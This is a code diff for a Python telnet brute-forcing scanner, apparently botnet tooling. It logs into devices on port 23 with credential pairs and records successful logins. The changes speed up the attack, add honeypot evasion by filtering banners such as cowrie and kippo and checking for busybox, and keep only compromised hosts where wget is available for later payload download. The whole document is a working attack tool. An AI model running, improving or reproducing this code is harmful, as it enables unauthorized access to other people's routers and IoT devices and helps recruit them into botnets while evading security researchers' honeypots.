@@ -76,7 +76,7 @@ class router(threading.Thread):
 			# Try to connect and authenticate
 			try:
 				tn = socket.socket()
-				tn.settimeout(8)
+				tn.settimeout(3)  # Reduced from 8 to 3 seconds
 				tn.connect((self.ip, 23))
 			except Exception:
 				try:
@@ -87,11 +87,12 @@ class router(threading.Thread):
 				continue
 			
 			try:
-				# Wait for login prompt
-				hoho = readUntil(tn, "ogin:")
+				# Fast login sequence - reduced timeouts
+				tn.settimeout(1.5)
+				hoho = readUntil(tn, "ogin:", timeout=1.5)
 				if "ogin" in hoho:
 					tn.send((username + "\n").encode())
-					time.sleep(0.09)
+					time.sleep(0.05)  # Reduced from 0.09
 				else:
 					try:
 						tn.close()
@@ -106,11 +107,12 @@ class router(threading.Thread):
 				continue
 			
 			try:
-				# Wait for password prompt
-				hoho = readUntil(tn, "assword:")
+				# Fast password sequence
+				tn.settimeout(1.5)
+				hoho = readUntil(tn, "assword:", timeout=1.5)
 				if "assword" in hoho:
 					tn.send((password + "\n").encode())
-					time.sleep(0.8)
+					time.sleep(0.3)  # Reduced from 0.8
 			except Exception:
 				try:
 					tn.close()
@@ -119,27 +121,37 @@ class router(threading.Thread):
 				continue
 			
 			try:
-				# Check for successful login
-				prompt = tn.recv(40960).decode('utf-8', errors='ignore')
+				# Check for successful login (quick banner + prompt read)
+				tn.settimeout(1.0)
+				prompt = tn.recv(2048).decode('utf-8', errors='ignore')
 				success = False
-				
-				if ">" in prompt and "ONT" not in prompt:
-					success = True
-				elif "#" in prompt or "$" in prompt or "%" in prompt or "@" in prompt:
+				# Fast-path prompt detection
+				if (">" in prompt and "ONT" not in prompt) or ("#" in prompt) or ("$" in prompt) or ("%" in prompt) or ("@" in prompt):
 					success = True
 				
 				if success:
-					# Check if it's a fake telnet/honeypot
-					if self.is_fake_telnet(tn):
+					# Optimized legit check (single RTT)
+					if not self.is_legit_telnet(tn):
+						# Log fake/honeypot result to console
+						try:
+							print("\033[31m[FAKE]\033[37m %s:23 %s:%s" % (self.ip, username, password))
+						except:
+							pass
 						try:
 							tn.close()
 						except:
 							pass
 						continue
-					
 					# Real device - Successful login!
-					os.system("echo "+self.ip+":23 "+username+":"+password+" >> "+output_file+"")
-					print("\033[32m[\033[31m+\033[32m] \033[33mGOTCHA \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m" % (username, password, self.ip))
+					# Test wget capability
+					wget_ok = self.test_wget(tn)
+					wget_status = "wget:OK" if wget_ok else "wget:NO"
+					
+					# Only export to file if wget is available
+					if wget_ok:
+						os.system("echo "+self.ip+":23 "+username+":"+password+" >> "+output_file+"")
+					
+					print("\033[32m[\033[31m+\033[32m] \033[33mGOTCHA \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m [%s]" % (username, password, self.ip, wget_status))
 					try:
 						tn.close()
 					except:
@@ -157,64 +169,93 @@ class router(threading.Thread):
 				except:
 					pass
 	
-	def is_fake_telnet(self, tn):
-		"""Check if telnet is fake/honeypot by testing shell commands"""
+	def is_legit_telnet(self, tn):
+		"""Fast legit telnet detection with minimal RTTs and banner heuristics."""
 		try:
-			# Try to get shell
-			tn.send(b"sh\n")
-			time.sleep(0.1)
-			tn.send(b"shell\n")
-			time.sleep(0.1)
-			
-			# Send echo test command
-			tn.send(b"echo TESTSHELL\n")
-			time.sleep(0.5)
-			
-			response = ""
+			# Tight timeouts for snappy detection
+			tn.settimeout(0.6)
+			# Single round-trip: echo marker and probe busybox version in one go
+			marker = "__AK47CHK__"
+			probe = ("echo " + marker + " && (busybox 2>/dev/null || true)\n").encode()
+			tn.send(probe)
+			time.sleep(0.25)
+			data = b""
 			try:
-				response = tn.recv(8192).decode('utf-8', errors='ignore')
-			except:
-				return True  # No response = fake
-			
-			# Check for valid shell response
-			if "TESTSHELL" in response:
-				# Now check for busybox (real IoT device indicator)
-				tn.send(b"busybox\n")
-				time.sleep(0.5)
-				
-				try:
-					busybox_response = tn.recv(8192).decode('utf-8', errors='ignore')
-				except:
-					return True
-				
-				# Real devices have busybox or show "BusyBox" in output
-				if "BusyBox" in busybox_response or "applet" in busybox_response or "built-in" in busybox_response.lower():
-					return False  # Real device
-				elif "not found" in busybox_response or "command" in busybox_response:
-					# Might be real but no busybox, do additional check
-					tn.send(b"cat /proc/cpuinfo\n")
-					time.sleep(0.3)
+				chunk = tn.recv(4096)
+				if chunk:
+					data += chunk
+				# Try to drain a bit more without blocking too long
+				tn.settimeout(0.2)
+				for _ in range(2):
 					try:
-						cpu_response = tn.recv(8192).decode('utf-8', errors='ignore')
-						if "processor" in cpu_response.lower() or "model" in cpu_response.lower():
-							return False  # Real device
+						chunk = tn.recv(4096)
+						if not chunk:
+							break
+						data += chunk
 					except:
-						pass
-					return True  # Likely fake
-				else:
-					return True  # Suspicious response
-			else:
-				# No echo response = likely fake/honeypot
+						break
+			except:
+				pass
+			resp = data.decode('utf-8', errors='ignore')
+			# Honeypot/fake banners to filter quickly
+			banners_sus = [
+				"cowrie", "kippo", "honeypot", "artillery", "conpot", "dionaea",
+				"nasl", "honeynet", "mock", "emulated", "unknown command"
+			]
+			lower = resp.lower()
+			for bad in banners_sus:
+				if bad in lower:
+					return False
+			# Need marker back to ensure command execution
+			if marker not in resp:
+				return False
+			# Strong IoT indicators
+			if "busybox" in lower or "applet" in lower or "built-in" in lower:
 				return True
+			# Fallback: environment check with a tiny RTT
+			tn.settimeout(0.4)
+			tn.send(b"uname -a || cat /proc/version || true\n")
+			time.sleep(0.2)
+			more = b""
+			try:
+				more = tn.recv(4096)
+			except:
+				pass
+			mresp = (resp + more.decode('utf-8', errors='ignore')).lower()
+			linux_indicators = ["linux", "gnu", "uclibc", "musl", "openwrt", "lede", "android"]
+			if any(ind in mresp for ind in linux_indicators):
+				return True
+			return False
 		except:
-			return True  # Error = assume fake
+			return False
+	
+	def test_wget(self, tn):
+		"""Test if wget is available on the device - optimized for speed"""
+		try:
+			tn.settimeout(0.8)  # Reduced from 1.0
+			# Fast wget test - single command
+			tn.send(b"command -v wget 2>/dev/null || echo NOWGET\n")
+			time.sleep(0.2)  # Reduced from 0.3
+			
+			response = b""
+			try:
+				response = tn.recv(1024)  # Reduced buffer size
+			except:
+				pass
+			
+			resp = response.decode('utf-8', errors='ignore').lower()
+			
+			# Quick check - if we get "NOWGET" it means wget not found
+			return "nowget" not in resp and ("wget" in resp or len(resp.strip()) > 0)
+		except:
+			return False
 
 def readUntil(tn, string, timeout=8):
 	buf = ''
 	start_time = time.time()
 	while time.time() - start_time < timeout:
 		buf += tn.recv(1024).decode('utf-8', errors='ignore')
-		time.sleep(0.01)
+		time.sleep(0.005)  # Reduced from 0.01
 		if string in buf: return buf
 	raise Exception('TIMEOUT!')
 
@@ -226,7 +267,7 @@ def worker():
 				thread = router(IP)
 				thread.start()
 				queue.task_done()
-				time.sleep(0.02)
+				time.sleep(0.01)  # Reduced thread delay
 			except:
 				pass
 	except:
